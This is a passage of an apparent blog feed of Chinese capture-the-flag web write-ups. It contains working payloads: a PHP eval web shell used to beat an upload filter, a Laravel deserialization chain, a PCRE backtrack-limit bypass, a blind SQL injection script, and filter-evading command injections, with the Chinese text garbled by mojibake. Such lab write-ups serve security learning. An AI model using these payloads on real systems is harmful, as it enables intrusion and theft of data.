<span class="keyword">if</span> <span class="string">&quot;JFIF&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            l = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = mid - <span class="number">1</span></span><br><span class="line">        <span class="comment"># time.sleep(0.03)</span></span><br><span class="line">    flag += (<span class="built_in">chr</span>(<span class="built_in">int</span>(r)))</span><br><span class="line">    print(<span class="built_in">chr</span>(<span class="built_in">int</span>(r)))</span><br><span class="line">    print(flag)</span><br><span class="line">print(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢ç»“æœï¼š    </p><p>åº“ï¼šciscnfinal</p><p>è¡¨ï¼šimagesï¼šid,path</p><p>â€‹        usersï¼š   usernameï¼šadmin<br>â€‹                         password ï¼še957ea7cd1b7147600b8</p><p>æ‰¾åˆ°äº†adminçš„è´¦å·ä¸å¯†ç ï¼Œç™»å½•ï¼š</p><img src="/images/CISCN2019-æ€»å†³èµ›-Day2-Web1-Easyweb/image-20210423120317916.png" alt="image-20210423120317916" style="zoom:80%;" /><p>user.phpæ˜¯ä¸€ä¸ªä¸Šä¼ ç‚¹â€¦â€¦</p><p>ä¸Šä¼ åä¼šç”Ÿæˆæäº¤è®°å½•ï¼Œè®°å½•äº†ä¸Šä¼ æ–‡ä»¶å</p><p>e.gï¼š/logs/upload.6274dd38c24268134ba3baabf7c82f0d.log.php</p><img src="/images/CISCN2019-æ€»å†³èµ›-Day2-Web1-Easyweb/image-20210423120733203.png" alt="image-20210423120733203" style="zoom:80%;" /><p>ä¸Šä¼ è¿‡æ»¤äº†phpâ€¦â€¦å¯ä»¥ä½¿ç”¨çŸ­æ ‡ç­¾ï¼š<code>&lt;?=eval($_GET[&#39;a&#39;])?&gt;</code></p><p>æµ‹è¯•ä¸€ä¸‹ï¼š</p><p>?a=echo 1;</p><img src="/images/CISCN2019-æ€»å†³èµ›-Day2-Web1-Easyweb/image-20210423120923447.png" alt="image-20210423120923447" style="zoom:80%;" /><p>æˆåŠŸæ‰§è¡Œäº†è¯­å¥ï¼Œèšå‰‘è¿æ¥ï¼Œåœ¨æ ¹ç›®å½•å³å¯æ‰¾åˆ°flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;CISCN2019-æ€»å†³èµ›-Day2-Web1-Easyweb&quot;&gt;&lt;a href=&quot;#CISCN2019-æ€»å†³èµ›-Day2-Web1-Easyweb&quot; class=&quot;headerlink&quot; title=&quot;[CISCN2019 æ€»å†³èµ› Day2 Web1]Easyw</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>MRctf2021</title>
    <link href="http://example.com/2021/04/18/MRctf2021/"/>
    <id>http://example.com/2021/04/18/MRctf2021/</id>
    <published>2021-04-18T03:28:55.000Z</published>
    <updated>2021-04-18T07:41:27.263Z</updated>
    
    <content type="html"><![CDATA[<h2 id="MRctf2021"><a href="#MRctf2021" class="headerlink" title="MRctf2021"></a>MRctf2021</h2><h3 id="ez-larave1"><a href="#ez-larave1" class="headerlink" title="ez_larave1"></a>ez_larave1</h3><blockquote><p>å®³â€¦â€¦åªåšå‡ºæ¥è¿™ä¸€é“ç­¾åˆ°é¢˜</p><p>æœ¬æ¥ä»¥ä¸ºå’Œ20å¹´ä¸€æ ·æ˜¯è‡ªå·±æ‰¾popï¼Œç¡¬æ˜¯æ‰¾ä¸åˆ°èœåˆ°æ”¾å¼ƒäº†ï¼Œç»“æœä¸€æœæœåˆ°ä¸ªcveâ€¦â€¦</p></blockquote><p>å…ˆæ‰¾ååºåˆ—åŒ–åˆ©ç”¨ç‚¹ï¼š</p><p>TaskController.phpï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TaskController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;action&#x27;</span>]) &amp;&amp; preg_match(<span class="string">&#x27;/serialize\/*$/i&#x27;</span>,   $_GET[<span class="string">&#x27;action&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/serialize/i&#x27;</span>, basename(  $_GET[<span class="string">&#x27;action&#x27;</span>])))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;ser&#x27;</span>]))&#123;</span><br><span class="line">                $ser = $_GET[<span class="string">&#x27;ser&#x27;</span>];</span><br><span class="line">                unserialize($ser);</span><br><span class="line">                <span class="keyword">return</span> ;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;no unserialization&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> ;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>indexæ–¹æ³•â€¦â€¦</p><p>è¿™é‡Œå­¦åˆ°äº†ï¼Œå…ˆæŸ¥è¯¢ç›¸å…³æ¡†æ¶çš„è·¯ç”±åŠ è½½æ–¹å¼ï¼Œçœ‹è·¯ç”±ï¼š</p><p><a href="https://laravelacademy.org/post/8731.html">https://laravelacademy.org/post/8731.html</a></p><p>web.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Route::get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> view(<span class="string">&#x27;welcome&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Route::get(<span class="string">&#x27;/hello&#x27;</span>,<span class="string">&#x27;TaskController@index&#x27;</span>);</span><br></pre></td></tr></table></figure><p>è®¿é—®/helloæ—¶ï¼Œä¼šåŠ è½½TaskControllerç±»çš„indexæ–¹æ³•ï¼Œè¿™é‡Œå°±æ˜¯æäº¤ç‚¹ã€‚</p><p>åˆ©ç”¨æ–¹æ³•ï¼šcve</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingBroadcast</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> $event;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$events=<span class="string">&quot;&quot;</span>,$event=<span class="string">&quot;&quot;</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = $events;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;event = $event;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Bus</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Dispatcher</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">queueResolver</span> = &quot;<span class="title">system</span>&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">BroadcastEvent</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">connection</span> = &quot;<span class="title">cat</span> /<span class="title">flag</span>&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title">d</span> = <span class="title">new</span> <span class="title">Illuminate</span>\<span class="title">Bus</span>\<span class="title">Dispatcher</span>();</span><br><span class="line">    $b = <span class="keyword">new</span> Illuminate\Broadcasting\BroadcastEvent();</span><br><span class="line">    $p = <span class="keyword">new</span> Illuminate\Broadcasting\PendingBroadcast($d,$b);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($p));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>èœåˆ°ç›´æ¥æ‹¿è„šæœ¬â€¦â€¦åŒ¹é…é‚£ä¸ªç›´æ¥ ç©ºæ ¼+%0aæ±¡æŸ“å³å¯ç»•è¿‡ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;MRctf2021&quot;&gt;&lt;a href=&quot;#MRctf2021&quot; class=&quot;headerlink&quot; title=&quot;MRctf2021&quot;&gt;&lt;/a&gt;MRctf2021&lt;/h2&gt;&lt;h3 id=&quot;ez-larave1&quot;&gt;&lt;a href=&quot;#ez-larave1&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>FBCTF2019-RCEService</title>
    <link href="http://example.com/2021/04/18/FBCTF2019-RCEService/"/>
    <id>http://example.com/2021/04/18/FBCTF2019-RCEService/</id>
    <published>2021-04-18T02:09:28.000Z</published>
    <updated>2021-04-18T03:25:49.533Z</updated>
    
    <content type="html"><![CDATA[<h3 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h3><img src="/images/FBCTF2019-RCEService/image-20210418101122350.png" alt="image-20210418101122350" style="zoom:80%;" /><p>æäº¤jsonæ ¼å¼çš„å‘½ä»¤ï¼Ÿ</p><p>åŸæœ¬é¢˜ç›®æ˜¯æä¾›äº†æºç çš„ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">putenv(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">  $json = $_REQUEST[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!is_string($json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (preg_match(<span class="string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, $json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    $cmd = json_decode($json, <span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> ($cmd !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">      system($cmd);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°±æ˜¯preg_matchçš„ä¸¤ç§ç»•è¿‡æ–¹æ³•ä¹‹ä¸€ ï¼šPHPåˆ©ç”¨PCREå›æº¯æ¬¡æ•°é™åˆ¶ç»•è¿‡æŸäº›å®‰å…¨é™åˆ¶</p><p><a href="https://www.freebuf.com/articles/web/190794.html">https://www.freebuf.com/articles/web/190794.html</a></p><blockquote><p>phpé‡‡ç”¨pcreä½œä¸ºæ­£åˆ™è¡¨è¾¾å¼åº“ï¼Œä¸ºäº†é˜²æ­¢æ­£åˆ™è¡¨è¾¾å¼çš„æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆreDOSï¼‰ï¼Œç»™ pcre è®¾å®šäº†ä¸€ä¸ªå›æº¯æ¬¡æ•°ä¸Šé™ pcre.backtrack_limitã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>var_dump(ini_get(&#39;pcre.backtrack_limit&#39;));</code>çš„æ–¹å¼æŸ¥çœ‹å½“å‰ç¯å¢ƒä¸‹çš„ä¸Šé™.</p><p>å‡è®¾æˆ‘ä»¬çš„å›æº¯æ¬¡æ•°è¶…è¿‡äº† 100 ä¸‡ï¼Œpreg_matchè¿”å›çš„é 1 å’Œ 0ï¼Œè€Œæ˜¯ falseã€‚</p></blockquote><p>æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ä½¿å¾—åŒ¹é…åˆ°çš„1å˜ä¸ºfalse</p><p>åœ¨æ„é€ çš„jsonæ•°æ®ä¸­æ„é€ ï¼Œè‹¥åŒ¹é…ä¸åˆ°ï¼Œä¼šä¸€æ­¥ä¸€æ­¥å›æº¯ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;ls&quot;,&quot;haha&quot;:&quot;&#x27;</span> + <span class="string">&quot;a&quot;</span>*(<span class="number">1000000</span>) + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">res = requests.post(<span class="string">&quot;http://8ccd1800-50a8-437a-b276-5606fc62242c.node3.buuoj.cn/&quot;</span>, data=&#123;<span class="string">&quot;cmd&quot;</span>:payload&#125;)</span><br><span class="line"><span class="keyword">print</span>(res.text)</span><br></pre></td></tr></table></figure><p>å› ä¸º<code>putenv(&#39;PATH=/home/rceservice/jail&#39;);</code>è®¾ç½®äº†ç¯å¢ƒå˜é‡ï¼Œæˆ‘ä»¬éœ€è¦ç»å¯¹è·¯å¾„æ¥ä½¿ç”¨å‘½ä»¤</p><blockquote><p>Linuxå‘½ä»¤çš„ä½ç½®ï¼š/bin,/usr/binï¼Œé»˜è®¤éƒ½æ˜¯å…¨ä½“ç”¨æˆ·ä½¿ç”¨ï¼Œ/sbin,/usr/sbin,é»˜è®¤rootç”¨æˆ·ä½¿ç”¨</p></blockquote><p>æŸ¥procç¯å¢ƒå˜é‡æŸ¥ä¸å‡ºæ¥ï¼Œåªèƒ½æŸ¥åˆ°cmdlineâ€¦â€¦</p><p>pwdï¼š/var/www/html</p><p>æŸ¥ä¸€ä¸‹è®¾ç½®çš„ç¯å¢ƒå˜é‡å‘ç°äº†flag</p><p>catä¸‹å³å¯ï¼š/bin/cat /home/rceservice/flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;FBCTF2019-RCEService&quot;&gt;&lt;a href=&quot;#FBCTF2019-RCEService&quot; class=&quot;headerlink&quot; title=&quot;[FBCTF2019]RCEService&quot;&gt;&lt;/a&gt;[FBCTF2019]RCEService&lt;/h3</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>WUSTCTF2020-é¢œå€¼æˆç»©æŸ¥è¯¢</title>
    <link href="http://example.com/2021/04/16/WUSTCTF2020-%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2/"/>
    <id>http://example.com/2021/04/16/WUSTCTF2020-%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2/</id>
    <published>2021-04-16T09:38:27.000Z</published>
    <updated>2021-04-18T02:08:46.512Z</updated>
    
    <content type="html"><![CDATA[<h3 id="WUSTCTF2020-é¢œå€¼æˆç»©æŸ¥è¯¢"><a href="#WUSTCTF2020-é¢œå€¼æˆç»©æŸ¥è¯¢" class="headerlink" title="[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢"></a>[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢</h3><p>è¿›å…¥é¢˜ç›®æ˜¯ä¸€ä¸ªæŸ¥è¯¢ï¼Œè”æƒ³åˆ°ä¹‹å‰åšçš„é¢˜ï¼š</p><p><img src="/images/WUSTCTF2020-é¢œå€¼æˆç»©æŸ¥è¯¢/image-20210416174013260.png" alt="image-20210416174013260" style="zoom:67%;" /><img src="/images/WUSTCTF2020-%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2/image-20210416174029609.png" alt="image-20210416174029609"></p><img src="/images/WUSTCTF2020-é¢œå€¼æˆç»©æŸ¥è¯¢/image-20210416174029609.png" alt="image-20210416174029609" style="zoom:67%;" /><p>è¿™é‡Œå°±æ˜¯ä¸€ä¸ªæ•°å€¼å‹çš„æ³¨å…¥ï¼Œå¥‡æ€ªçš„æ˜¯ï¼Œå•¥éƒ½æ²¡è¿‡æ»¤ï¼Œç›´æ¥ç›²æ³¨ï¼š</p><p>?stunum=if(ord(substr(database(),0,1))&gt;=0,1,0)%23</p><img src="/images/WUSTCTF2020-é¢œå€¼æˆç»©æŸ¥è¯¢/image-20210416174225317.png" alt="image-20210416174225317" style="zoom:80%;" /><p>?stunum=if(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0,1))&gt;=0,1,0)%23</p><img src="/images/WUSTCTF2020-é¢œå€¼æˆç»©æŸ¥è¯¢/image-20210416174243563.png" alt="image-20210416174243563" style="zoom:80%;" /><p>è¡¨ï¼š</p><img src="/images/WUSTCTF2020-é¢œå€¼æˆç»©æŸ¥è¯¢/image-20210416174303651.png" alt="image-20210416174303651" style="zoom:80%;" /><p>flagåœ¨valueåˆ—ä¸­ï¼š</p><img src="/images/WUSTCTF2020-é¢œå€¼æˆç»©æŸ¥è¯¢/image-20210416174324714.png" alt="image-20210416174324714" style="zoom:80%;" /><p>è„šæœ¬ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> x in range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    l = <span class="number">32</span></span><br><span class="line">    r = <span class="number">126</span></span><br><span class="line">    <span class="keyword">while</span> r &gt; l:</span><br><span class="line">        mid = <span class="keyword">int</span>((l + r + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">        x = str(x)</span><br><span class="line">        y = str(mid)</span><br><span class="line">        url = <span class="string">&#x27;http://ae264edd-9cc0-4005-8193-2fe2294f2118.node3.buuoj.cn/?stunum=if(ord(substr((select(value)from(flag)),&#x27;</span>+x+<span class="string">&#x27;,1))&gt;=&#x27;</span>+y+<span class="string">&#x27;,1,0)#&#x27;</span></span><br><span class="line">        response = requests.get(url=url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;admin&quot;</span> in response.text:</span><br><span class="line">            l = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = mid - <span class="number">1</span></span><br><span class="line">        time.sleep(<span class="number">0.03</span>)</span><br><span class="line">    flag += (chr(<span class="keyword">int</span>(r)))</span><br><span class="line">    <span class="keyword">print</span>(chr(<span class="keyword">int</span>(r)))</span><br><span class="line">    <span class="keyword">print</span>(flag)</span><br><span class="line"><span class="keyword">print</span>(flag)</span><br></pre></td></tr></table></figure><p>ï¼ˆæœ€è¿‘æ²¡æ€ä¹ˆåšsqlæ³¨å…¥çš„é¢˜ï¼Œæ‰‹æœ‰ç‚¹ç”Ÿâ€¦â€¦</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;WUSTCTF2020-é¢œå€¼æˆç»©æŸ¥è¯¢&quot;&gt;&lt;a href=&quot;#WUSTCTF2020-é¢œå€¼æˆç»©æŸ¥è¯¢&quot; class=&quot;headerlink&quot; title=&quot;[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢&quot;&gt;&lt;/a&gt;[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢&lt;/h3&gt;&lt;p&gt;è¿›å…¥é¢˜ç›®</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>EasyBypass</title>
    <link href="http://example.com/2021/04/15/EasyBypass/"/>
    <id>http://example.com/2021/04/15/EasyBypass/</id>
    <published>2021-04-15T10:19:52.000Z</published>
    <updated>2021-04-15T10:29:10.754Z</updated>
    
    <content type="html"><![CDATA[<h3 id="EasyBypass"><a href="#EasyBypass" class="headerlink" title="EasyBypass"></a>EasyBypass</h3><p>buuæ–°ä¸Šé¢˜ï¼Œæƒ³å¿…ä¸ä¹…ä¹‹åå°±ä¼šæˆä¸€åˆ†é¢˜äº†â€¦â€¦</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">$comm1 = $_GET[<span class="string">&#x27;comm1&#x27;</span>];</span><br><span class="line">$comm2 = $_GET[<span class="string">&#x27;comm2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&#x27;|\`|\\|\*|\n|\t|\xA0|\r|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;</span>, $comm1))</span><br><span class="line">    $comm1 = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&#x27;|\&quot;|;|,|\`|\*|\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||ls|\||tail|more|cat|string|bin|less||tac|sh|flag|find|grep|echo|w/is&quot;</span>, $comm2))</span><br><span class="line">    $comm2 = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">$flag = <span class="string">&quot;#flag in /flag&quot;</span>;</span><br><span class="line"></span><br><span class="line">$comm1 = <span class="string">&#x27;&quot;&#x27;</span> . $comm1 . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">$comm2 = <span class="string">&#x27;&quot;&#x27;</span> . $comm2 . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">$cmd = <span class="string">&quot;file <span class="subst">$comm1</span> <span class="subst">$comm2</span>&quot;</span>;</span><br><span class="line">system($cmd);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿‡æ»¤ç»•è¿‡rce</p><p>ä¸€ç•ªå°è¯•å‘ç°ï¼Œcomm2çš„è¿‡æ»¤æ¯”comm1ä¸¥æ ¼çš„å¤šï¼Œé‚£å°±åªç”¨comm1ï¼Œé—­åˆåé¢çš„å¼•å·å³å¯æ‰§è¡Œå‘½ä»¤</p><p>è¯»å–flagçš„æ—¶å€™å‘ç°flagä¹Ÿæœ‰è¿‡æ»¤ï¼Œç„¶è€Œf\lagå°±è¡Œäº†â€¦â€¦</p><p><code>/?comm1=-f&quot; &quot;/etc/hosts</code></p><p><img src="/images/EasyBypass/image-20210415182443139.png" alt="image-20210415182443139"></p><p><code>?comm1=-f&quot; /fla\g;od /fla\g;&quot;</code></p><p><img src="/images/EasyBypass/image-20210415182547134.png" alt="image-20210415182547134"></p><p>odå€’æ˜¯å¯ä»¥ç”¨â€¦â€¦</p><p>æ‹¼æ¥äº¦å¯ï¼š<code>?comm1=-f&quot; ;a=ca;b=t;c=g;$a$b /fla$c;&quot;</code></p><p><img src="/images/EasyBypass/image-20210415182901338.png" alt="image-20210415182901338"></p><p>æ–¹æ³•æŒºå¤šâ€¦â€¦</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;EasyBypass&quot;&gt;&lt;a href=&quot;#EasyBypass&quot; class=&quot;headerlink&quot; title=&quot;EasyBypass&quot;&gt;&lt;/a&gt;EasyBypass&lt;/h3&gt;&lt;p&gt;buuæ–°ä¸Šé¢˜ï¼Œæƒ³å¿…ä¸ä¹…ä¹‹åå°±ä¼šæˆä¸€åˆ†é¢˜äº†â€¦â€¦&lt;/p&gt;
&lt;figure cla</summary>
      
    
    
    
    
  </entry>
  
</feed>
